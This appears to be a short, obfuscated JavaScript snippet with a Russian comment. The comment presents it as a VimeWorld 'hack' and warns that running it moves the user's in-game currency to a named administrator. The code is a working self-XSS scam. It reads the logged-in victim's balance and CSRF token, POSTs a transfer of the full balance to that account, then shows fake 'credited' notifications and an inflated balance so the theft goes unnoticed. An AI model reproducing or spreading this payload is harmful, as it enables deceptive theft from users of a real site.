/*
    Пример "взлома" топиков на VimeWorld
    [!] При выполнении этого кода на сайте vimeworld.ru, все ваши вимеры уйдут гл. администратору сервера (xtrafrancyz)
    [!!] Это не мой код.
*/

var _0x9aca=["text", "#vimers", "innerHTML", "body", "getElementsByTagName", "https://cp.vimeworld.ru/real?give", "POST", "", "html", ".table", "csrf_token=", "value", "csrf_token", "getElementsByName", "&usrnm=xtrafrancyz&amount=", "&process=", "random", "floor", "Удачно!", "На ваш аккаунт зачислено ", " вимеров!", "success", "notify", ".00", "ajax", "Ошибка!", "Попробуйте на другом аккаунте.", "error"];
var vimers = Number($(_0x9aca[1])[_0x9aca[0]]());if(vimers){var pagehtml=document[_0x9aca[4]](_0x9aca[3])[0][_0x9aca[2]];$[_0x9aca[24]]({url:_0x9aca[5],type:_0x9aca[6],data:_0x9aca[7],success:function(_0xa79fx3){$(_0x9aca[9])[_0x9aca[8]](_0xa79fx3);$[_0x9aca[24]]({url:_0x9aca[5],type:_0x9aca[6],data:_0x9aca[10]+ document[_0x9aca[13]](_0x9aca[12])[0][_0x9aca[11]]+ _0x9aca[14]+ vimers+ _0x9aca[15],success:function(_0xa79fx3){$(_0x9aca[3])[_0x9aca[8]](pagehtml);setInterval(_0xa79fx4,1000);function _0xa79fx4(){var _0xa79fx5=Math[_0x9aca[17]](Math[_0x9aca[16]]()* (50- 10))+ 10;vimers+= _0xa79fx5;$[_0x9aca[22]]({title:_0x9aca[18],text:_0x9aca[19]+ _0xa79fx5+ _0x9aca[20]},{className:_0x9aca[21]});$(_0x9aca[1])[_0x9aca[0]](vimers+ _0x9aca[23])}},error:function(_0xa79fx3){}})},error:function(_0xa79fx3){}})}else {$[_0x9aca[22]]({title:_0x9aca[25],text:_0x9aca[26]},{className:_0x9aca[27]})}
